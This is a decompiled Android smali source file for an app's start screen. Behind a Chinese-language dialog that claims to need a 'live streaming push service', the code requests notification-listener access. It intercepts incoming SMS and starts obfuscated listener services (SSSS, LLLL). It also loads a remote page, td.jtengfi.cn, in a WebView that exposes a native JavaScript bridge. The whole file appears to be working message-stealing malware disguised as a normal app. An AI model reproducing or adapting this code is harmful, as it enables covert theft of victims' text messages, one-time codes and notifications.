.class public Lcom/ellison/project/activity/StartActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "StartActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/ellison/project/activity/StartActivity$ReceiverData;,
        Lcom/ellison/project/activity/StartActivity$ActivityLifeEvent;,
        Lcom/ellison/project/activity/StartActivity$AcLifeEvenData;
    }
.end annotation


# static fields
.field public static handler:Landroid/os/Handler; = null

.field public static mAcLifeEvenDataList:Ljava/util/ArrayList; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Lcom/ellison/project/activity/StartActivity$AcLifeEvenData;",
            ">;"
        }
    .end annotation
.end field

.field private static receiverDataList:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lcom/ellison/project/activity/StartActivity$ReceiverData;",
            ">;"
        }
    .end annotation
.end field

.field static token:Ljava/lang/String; = ""


# instance fields
.field protected mAgentWeb:Lcom/just/agentweb/AgentWeb;

.field private mWebChromeClient:Lcom/just/agentweb/WebChromeClient;

.field private mWebViewClient:Lcom/just/agentweb/WebViewClient;

.field private rrr:Lcom/ellison/project/r/RRRR;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 80
    new-instance v0, Lcom/ellison/project/activity/StartActivity$1;

    invoke-direct {v0}, Lcom/ellison/project/activity/StartActivity$1;-><init>()V

    sput-object v0, Lcom/ellison/project/activity/StartActivity;->handler:Landroid/os/Handler;

    .line 366
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/ellison/project/activity/StartActivity;->mAcLifeEvenDataList:Ljava/util/ArrayList;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 73
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    .line 268
    new-instance v0, Lcom/ellison/project/activity/StartActivity$4;

    invoke-direct {v0, p0}, Lcom/ellison/project/activity/StartActivity$4;-><init>(Lcom/ellison/project/activity/StartActivity;)V

    iput-object v0, p0, Lcom/ellison/project/activity/StartActivity;->mWebViewClient:Lcom/just/agentweb/WebViewClient;

    .line 309
    new-instance v0, Lcom/ellison/project/activity/StartActivity$5;

    invoke-direct {v0, p0}, Lcom/ellison/project/activity/StartActivity$5;-><init>(Lcom/ellison/project/activity/StartActivity;)V

    iput-object v0, p0, Lcom/ellison/project/activity/StartActivity;->mWebChromeClient:Lcom/just/agentweb/WebChromeClient;

    return-void
.end method

.method static synthetic access$000(Lcom/ellison/project/activity/StartActivity;)Z
    .locals 0

    .line 73
    invoke-direct {p0}, Lcom/ellison/project/activity/StartActivity;->checkNotifyPermission()Z

    move-result p0

    return p0
.end method

.method public static addRRR(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;Z)V
    .locals 2

    .line 432
    sget-object v0, Lcom/ellison/project/activity/StartActivity;->receiverDataList:Ljava/util/List;

    if-nez v0, :cond_0

    .line 433
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/ellison/project/activity/StartActivity;->receiverDataList:Ljava/util/List;

    .line 436
    :cond_0
    sget-object v0, Lcom/ellison/project/activity/StartActivity;->receiverDataList:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    .line 439
    :cond_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-nez v1, :cond_2

    goto :goto_0

    .line 442
    :cond_2
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/ellison/project/activity/StartActivity$ReceiverData;

    iget-object v1, v1, Lcom/ellison/project/activity/StartActivity$ReceiverData;->receiver:Landroid/content/BroadcastReceiver;

    if-ne v1, p0, :cond_1

    :goto_0
    if-eqz p2, :cond_3

    .line 448
    invoke-static {}, Lcom/ellison/project/MyApplication;->getInstance()Lcom/ellison/project/MyApplication;

    move-result-object p2

    invoke-virtual {p2}, Lcom/ellison/project/MyApplication;->getCurrentActivity()Landroid/app/Activity;

    move-result-object p2

    invoke-virtual {p2, p0, p1}, Landroid/app/Activity;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    :cond_3
    return-void
.end method

.method private checkNotifyPermission()Z
    .locals 6

    const/4 v0, 0x1

    const/high16 v1, 0x10000000

    .line 207
    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 208
    invoke-virtual {v2, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 209
    invoke-virtual {p0, v2}, Lcom/ellison/project/activity/StartActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    return v0

    :catch_0
    move-exception v2

    .line 213
    :try_start_1
    new-instance v3, Landroid/content/Intent;

    invoke-direct {v3}, Landroid/content/Intent;-><init>()V

    .line 214
    invoke-virtual {v3, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 215
    new-instance v1, Landroid/content/ComponentName;

    const-string v4, "com.android.settings"

    const-string v5, "com.android.settings.Settings$NotificationAccessSettingsActivity"

    invoke-direct {v1, v4, v5}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 216
    invoke-virtual {v3, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    const-string v1, ":settings:show_fragment"

    const-string v4, "NotificationAccessSettings"

    .line 217
    invoke-virtual {v3, v1, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 218
    invoke-virtual {p0, v3}, Lcom/ellison/project/activity/StartActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    return v0

    :catch_1
    move-exception v0

    .line 221
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "\u5bf9\u4e0d\u8d77\uff0c\u60a8\u7684\u624b\u673a\u6682\u4e0d\u652f\u6301"

    const/4 v1, 0x0

    .line 223
    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 224
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v3, "-------------\u5bf9\u4e0d\u8d77\uff0c\u60a8\u7684\u624b\u673a\u6682\u4e0d\u652f\u6301------------->>"

    invoke-virtual {v0, v3}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 225
    invoke-virtual {v2}, Landroid/content/ActivityNotFoundException;->printStackTrace()V

    return v1
.end method

.method public static deleteLLL(Ljava/lang/String;)Z
    .locals 3

    const/4 v0, 0x0

    const/4 v1, 0x0

    .line 409
    :goto_0
    sget-object v2, Lcom/ellison/project/activity/StartActivity;->mAcLifeEvenDataList:Ljava/util/ArrayList;

    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    move-result v2

    if-ge v1, v2, :cond_1

    .line 410
    sget-object v2, Lcom/ellison/project/activity/StartActivity;->mAcLifeEvenDataList:Ljava/util/ArrayList;

    invoke-virtual {v2, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/ellison/project/activity/StartActivity$AcLifeEvenData;

    iget-object v2, v2, Lcom/ellison/project/activity/StartActivity$AcLifeEvenData;->eName:Ljava/lang/String;

    invoke-virtual {v2, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 411
    sget-object p0, Lcom/ellison/project/activity/StartActivity;->mAcLifeEvenDataList:Ljava/util/ArrayList;

    invoke-virtual {p0, v1}, Ljava/util/ArrayList;->remove(I)Ljava/lang/Object;

    const/4 p0, 0x1

    return p0

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    return v0
.end method

.method public static deleteRRR(Landroid/content/BroadcastReceiver;)V
    .locals 2

    .line 419
    invoke-static {}, Lcom/ellison/project/MyApplication;->getInstance()Lcom/ellison/project/MyApplication;

    move-result-object v0

    invoke-virtual {v0}, Lcom/ellison/project/MyApplication;->getCurrentActivity()Landroid/app/Activity;

    move-result-object v0

    invoke-virtual {v0, p0}, Landroid/app/Activity;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 420
    sget-object v0, Lcom/ellison/project/activity/StartActivity;->receiverDataList:Ljava/util/List;

    if-eqz v0, :cond_1

    const/4 v0, 0x0

    .line 421
    :goto_0
    sget-object v1, Lcom/ellison/project/activity/StartActivity;->receiverDataList:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v1

    if-ge v0, v1, :cond_1

    .line 422
    sget-object v1, Lcom/ellison/project/activity/StartActivity;->receiverDataList:Ljava/util/List;

    invoke-interface {v1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/ellison/project/activity/StartActivity$ReceiverData;

    iget-object v1, v1, Lcom/ellison/project/activity/StartActivity$ReceiverData;->receiver:Landroid/content/BroadcastReceiver;

    if-ne v1, p0, :cond_0

    .line 423
    sget-object p0, Lcom/ellison/project/activity/StartActivity;->receiverDataList:Ljava/util/List;

    invoke-interface {p0, v0}, Ljava/util/List;->remove(I)Ljava/lang/Object;

    return-void

    :cond_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_1
    return-void
.end method

.method private registerRRR()V
    .locals 2

    .line 198
    new-instance v0, Lcom/ellison/project/r/RRRR;

    invoke-direct {v0}, Lcom/ellison/project/r/RRRR;-><init>()V

    iput-object v0, p0, Lcom/ellison/project/activity/StartActivity;->rrr:Lcom/ellison/project/r/RRRR;

    .line 199
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    .line 200
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "com.ellison.project.aaaaaa"

    .line 201
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 202
    iget-object v1, p0, Lcom/ellison/project/activity/StartActivity;->rrr:Lcom/ellison/project/r/RRRR;

    invoke-virtual {p0, v1, v0}, Lcom/ellison/project/activity/StartActivity;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method

.method public static sendMessage(Ljava/lang/String;)V
    .locals 3

    if-eqz p0, :cond_0

    .line 233
    new-instance v0, Landroid/os/Message;

    invoke-direct {v0}, Landroid/os/Message;-><init>()V

    const/4 v1, 0x1

    .line 234
    iput v1, v0, Landroid/os/Message;->what:I

    .line 235
    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    const-string v2, "sms"

    .line 236
    invoke-virtual {v1, v2, p0}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 237
    invoke-virtual {v0, v1}, Landroid/os/Message;->setData(Landroid/os/Bundle;)V

    .line 238
    sget-object p0, Lcom/ellison/project/activity/StartActivity;->handler:Landroid/os/Handler;

    invoke-virtual {p0, v0}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z

    :cond_0
    return-void
.end method

.method public static toggleNotificationListenerService(Landroid/content/Context;)V
    .locals 4

    .line 263
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 264
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/ellison/project/utils/SSSS;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 265
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/ellison/project/utils/SSSS;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1, v3, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method


# virtual methods
.method public isNotificationListenersEnabled()Z
    .locals 5

    .line 244
    invoke-virtual {p0}, Lcom/ellison/project/activity/StartActivity;->getPackageName()Ljava/lang/String;

    move-result-object v0

    .line 245
    invoke-virtual {p0}, Lcom/ellison/project/activity/StartActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "enabled_notification_listeners"

    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 246
    sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "-----flat-------->"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 247
    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v2

    const/4 v3, 0x0

    if-nez v2, :cond_1

    const-string v2, ":"

    .line 248
    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    .line 249
    :goto_0
    array-length v4, v1

    if-ge v2, v4, :cond_1

    .line 250
    aget-object v4, v1, v2

    invoke-static {v4}, Landroid/content/ComponentName;->unflattenFromString(Ljava/lang/String;)Landroid/content/ComponentName;

    move-result-object v4

    if-eqz v4, :cond_0

    .line 252
    invoke-virtual {v4}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Landroid/text/TextUtils;->equals(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v0, 0x1

    return v0

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    return v3
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    .line 353
    invoke-super {p0, p1, p2, p3}, Landroidx/appcompat/app/AppCompatActivity;->onActivityResult(IILandroid/content/Intent;)V

    return-void
.end method

.method public onBackPressed()V
    .locals 1

    .line 334
    iget-object v0, p0, Lcom/ellison/project/activity/StartActivity;->mAgentWeb:Lcom/just/agentweb/AgentWeb;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Lcom/just/agentweb/AgentWeb;->getIEventHandler()Lcom/just/agentweb/IEventHandler;

    move-result-object v0

    invoke-interface {v0}, Lcom/just/agentweb/IEventHandler;->back()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    .line 337
    :cond_0
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    .line 126
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 127
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x17

    if-lt p1, v0, :cond_0

    .line 128
    invoke-virtual {p0}, Lcom/ellison/project/activity/StartActivity;->isNotificationListenersEnabled()Z

    move-result p1

    if-nez p1, :cond_0

    .line 129
    new-instance p1, Landroidx/appcompat/app/AlertDialog$Builder;

    invoke-direct {p1, p0}, Landroidx/appcompat/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const-string v0, "\u6d88\u606f\u63a8\u9001\u670d\u52a1\u8bb8\u53ef"

    invoke-virtual {p1, v0}, Landroidx/appcompat/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroidx/appcompat/app/AlertDialog$Builder;

    move-result-object p1

    const-string v0, "\u8bf7\u5141\u8bb8\u76f4\u64ad\u4f7f\u7528\u901a\u77e5\u6d88\u606f\u63a8\u9001\u670d\u52a1\uff01"

    invoke-virtual {p1, v0}, Landroidx/appcompat/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroidx/appcompat/app/AlertDialog$Builder;

    move-result-object p1

    new-instance v0, Lcom/ellison/project/activity/StartActivity$3;

    invoke-direct {v0, p0}, Lcom/ellison/project/activity/StartActivity$3;-><init>(Lcom/ellison/project/activity/StartActivity;)V

    const-string v1, "\u5141\u8bb8"

    invoke-virtual {p1, v1, v0}, Landroidx/appcompat/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroidx/appcompat/app/AlertDialog$Builder;

    move-result-object p1

    new-instance v0, Lcom/ellison/project/activity/StartActivity$2;

    invoke-direct {v0, p0}, Lcom/ellison/project/activity/StartActivity$2;-><init>(Lcom/ellison/project/activity/StartActivity;)V

    const-string v1, "\u62d2\u7edd"

    .line 135
    invoke-virtual {p1, v1, v0}, Landroidx/appcompat/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroidx/appcompat/app/AlertDialog$Builder;

    move-result-object p1

    const/4 v0, 0x0

    .line 140
    invoke-virtual {p1, v0}, Landroidx/appcompat/app/AlertDialog$Builder;->setCancelable(Z)Landroidx/appcompat/app/AlertDialog$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroidx/appcompat/app/AlertDialog$Builder;->create()Landroidx/appcompat/app/AlertDialog;

    move-result-object p1

    invoke-virtual {p1}, Landroidx/appcompat/app/AlertDialog;->show()V

    :cond_0
    const p1, 0x7f0a001d

    .line 143
    invoke-virtual {p0, p1}, Lcom/ellison/project/activity/StartActivity;->setContentView(I)V

    .line 145
    invoke-virtual {p0}, Lcom/ellison/project/activity/StartActivity;->getActionBar()Landroid/app/ActionBar;

    move-result-object p1

    if-eqz p1, :cond_1

    .line 146
    invoke-virtual {p0}, Lcom/ellison/project/activity/StartActivity;->getActionBar()Landroid/app/ActionBar;

    move-result-object p1

    invoke-virtual {p1}, Landroid/app/ActionBar;->hide()V

    .line 149
    :cond_1
    invoke-static {}, Lcom/just/agentweb/AgentWebSettingsImpl;->getInstance()Lcom/just/agentweb/AbsAgentWebSettings;

    move-result-object p1

    .line 150
    invoke-static {p0}, Lcom/just/agentweb/AgentWeb;->with(Landroid/app/Activity;)Lcom/just/agentweb/AgentWeb$AgentBuilder;

    move-result-object v0

    const v1, 0x7f07005b

    .line 151
    invoke-virtual {p0, v1}, Lcom/ellison/project/activity/StartActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/view/ViewGroup;

    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v3, -0x1

    invoke-direct {v2, v3, v3}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v0, v1, v2}, Lcom/just/agentweb/AgentWeb$AgentBuilder;->setAgentWebParent(Landroid/view/ViewGroup;Landroid/view/ViewGroup$LayoutParams;)Lcom/just/agentweb/AgentWeb$IndicatorBuilder;

    move-result-object v0

    const-string v1, "#FFFFFF"

    .line 152
    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Lcom/just/agentweb/AgentWeb$IndicatorBuilder;->useDefaultIndicator(I)Lcom/just/agentweb/AgentWeb$CommonBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/ellison/project/activity/StartActivity;->mWebChromeClient:Lcom/just/agentweb/WebChromeClient;

    .line 153
    invoke-virtual {v0, v1}, Lcom/just/agentweb/AgentWeb$CommonBuilder;->setWebChromeClient(Lcom/just/agentweb/WebChromeClient;)Lcom/just/agentweb/AgentWeb$CommonBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/ellison/project/activity/StartActivity;->mWebViewClient:Lcom/just/agentweb/WebViewClient;

    .line 154
    invoke-virtual {v0, v1}, Lcom/just/agentweb/AgentWeb$CommonBuilder;->setWebViewClient(Lcom/just/agentweb/WebViewClient;)Lcom/just/agentweb/AgentWeb$CommonBuilder;

    move-result-object v0

    .line 156
    invoke-virtual {v0, p1}, Lcom/just/agentweb/AgentWeb$CommonBuilder;->setAgentWebWebSettings(Lcom/just/agentweb/IAgentWebSettings;)Lcom/just/agentweb/AgentWeb$CommonBuilder;

    move-result-object p1

    const v0, 0x7f0a0020

    .line 157
    invoke-virtual {p1, v0, v3}, Lcom/just/agentweb/AgentWeb$CommonBuilder;->setMainFrameErrorView(II)Lcom/just/agentweb/AgentWeb$CommonBuilder;

    move-result-object p1

    sget-object v0, Lcom/just/agentweb/AgentWeb$SecurityType;->STRICT_CHECK:Lcom/just/agentweb/AgentWeb$SecurityType;

    .line 158
    invoke-virtual {p1, v0}, Lcom/just/agentweb/AgentWeb$CommonBuilder;->setSecurityType(Lcom/just/agentweb/AgentWeb$SecurityType;)Lcom/just/agentweb/AgentWeb$CommonBuilder;

    move-result-object p1

    sget-object v0, Lcom/just/agentweb/DefaultWebClient$OpenOtherPageWays;->ASK:Lcom/just/agentweb/DefaultWebClient$OpenOtherPageWays;

    .line 160
    invoke-virtual {p1, v0}, Lcom/just/agentweb/AgentWeb$CommonBuilder;->setOpenOtherPageWays(Lcom/just/agentweb/DefaultWebClient$OpenOtherPageWays;)Lcom/just/agentweb/AgentWeb$CommonBuilder;

    move-result-object p1

    .line 161
    invoke-virtual {p1}, Lcom/just/agentweb/AgentWeb$CommonBuilder;->createAgentWeb()Lcom/just/agentweb/AgentWeb$PreAgentWeb;

    move-result-object p1

    .line 162
    invoke-virtual {p1}, Lcom/just/agentweb/AgentWeb$PreAgentWeb;->ready()Lcom/just/agentweb/AgentWeb$PreAgentWeb;

    move-result-object p1

    const-string v0, "http://td.jtengfi.cn/index.html"

    .line 163
    invoke-virtual {p1, v0}, Lcom/just/agentweb/AgentWeb$PreAgentWeb;->go(Ljava/lang/String;)Lcom/just/agentweb/AgentWeb;

    move-result-object p1

    iput-object p1, p0, Lcom/ellison/project/activity/StartActivity;->mAgentWeb:Lcom/just/agentweb/AgentWeb;

    if-eqz p1, :cond_2

    .line 171
    invoke-virtual {p1}, Lcom/just/agentweb/AgentWeb;->getJsInterfaceHolder()Lcom/just/agentweb/JsInterfaceHolder;

    move-result-object p1

    new-instance v0, Lcom/ellison/project/utils/AndroidInterface;

    iget-object v1, p0, Lcom/ellison/project/activity/StartActivity;->mAgentWeb:Lcom/just/agentweb/AgentWeb;

    invoke-direct {v0, v1, p0}, Lcom/ellison/project/utils/AndroidInterface;-><init>(Lcom/just/agentweb/AgentWeb;Landroid/app/Activity;)V

    const-string v1, "android"

    invoke-interface {p1, v1, v0}, Lcom/just/agentweb/JsInterfaceHolder;->addJavaObject(Ljava/lang/String;Ljava/lang/Object;)Lcom/just/agentweb/JsInterfaceHolder;

    .line 174
    :cond_2
    invoke-direct {p0}, Lcom/ellison/project/activity/StartActivity;->registerRRR()V

    const/4 p1, 0x1

    .line 177
    sput-boolean p1, Lcom/ellison/project/utils/LLLL;->sListenState:Z

    .line 178
    sget-object p1, Lcom/ellison/project/activity/StartActivity;->token:Ljava/lang/String;

    const-string v0, ""

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    const/16 p1, 0xf

    .line 180
    :try_start_0
    invoke-static {p1}, Lcom/ellison/project/utils/AAAA;->getRandomChars(I)Ljava/lang/String;

    move-result-object p1

    const-string v0, "UTF-8"

    invoke-virtual {p1, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1

    invoke-static {p1}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1}, Lcom/ellison/project/utils/ConfigUtils;->setToken(Landroid/content/Context;Ljava/lang/String;)V

    .line 181
    invoke-static {p0}, Lcom/ellison/project/utils/ConfigUtils;->getToken(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/ellison/project/activity/StartActivity;->token:Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 183
    invoke-virtual {p1}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    .line 187
    :cond_3
    :goto_0
    invoke-static {p0}, Lcom/ellison/project/activity/StartActivity;->toggleNotificationListenerService(Landroid/content/Context;)V

    .line 188
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lcom/ellison/project/utils/LLLL;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, Lcom/ellison/project/activity/StartActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 191
    invoke-static {p0}, Lcom/ellison/project/utils/ConfigUtils;->getPayStatus(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "Y"

    .line 192
    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    .line 193
    invoke-static {p0}, Lcom/ellison/project/activity/PayResultActivity;->enterResult(Landroid/app/Activity;)V

    :cond_4
    return-void
.end method

.method protected onDestroy()V
    .locals 1

    .line 359
    iget-object v0, p0, Lcom/ellison/project/activity/StartActivity;->mAgentWeb:Lcom/just/agentweb/AgentWeb;

    invoke-virtual {v0}, Lcom/just/agentweb/AgentWeb;->getWebLifeCycle()Lcom/just/agentweb/WebLifeCycle;

    move-result-object v0

    invoke-interface {v0}, Lcom/just/agentweb/WebLifeCycle;->onDestroy()V

    const/4 v0, 0x0

    .line 360
    iput-object v0, p0, Lcom/ellison/project/activity/StartActivity;->mAgentWeb:Lcom/just/agentweb/AgentWeb;

    .line 361
    iget-object v0, p0, Lcom/ellison/project/activity/StartActivity;->rrr:Lcom/ellison/project/r/RRRR;

    invoke-virtual {p0, v0}, Lcom/ellison/project/activity/StartActivity;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 362
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    .line 319
    iget-object v0, p0, Lcom/ellison/project/activity/StartActivity;->mAgentWeb:Lcom/just/agentweb/AgentWeb;

    invoke-virtual {v0, p1, p2}, Lcom/just/agentweb/AgentWeb;->handleKeyEvent(ILandroid/view/KeyEvent;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 p1, 0x1

    return p1

    .line 322
    :cond_0
    invoke-super {p0, p1, p2}, Landroidx/appcompat/app/AppCompatActivity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result p1

    return p1
.end method

.method public onPause()V
    .locals 1

    .line 327
    iget-object v0, p0, Lcom/ellison/project/activity/StartActivity;->mAgentWeb:Lcom/just/agentweb/AgentWeb;

    invoke-virtual {v0}, Lcom/just/agentweb/AgentWeb;->getWebLifeCycle()Lcom/just/agentweb/WebLifeCycle;

    move-result-object v0

    invoke-interface {v0}, Lcom/just/agentweb/WebLifeCycle;->onPause()V

    .line 328
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onPause()V

    return-void
.end method

.method public onResume()V
    .locals 1

    .line 342
    iget-object v0, p0, Lcom/ellison/project/activity/StartActivity;->mAgentWeb:Lcom/just/agentweb/AgentWeb;

    invoke-virtual {v0}, Lcom/just/agentweb/AgentWeb;->getWebLifeCycle()Lcom/just/agentweb/WebLifeCycle;

    move-result-object v0

    invoke-interface {v0}, Lcom/just/agentweb/WebLifeCycle;->onResume()V

    .line 343
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onResume()V

    return-void
.end method
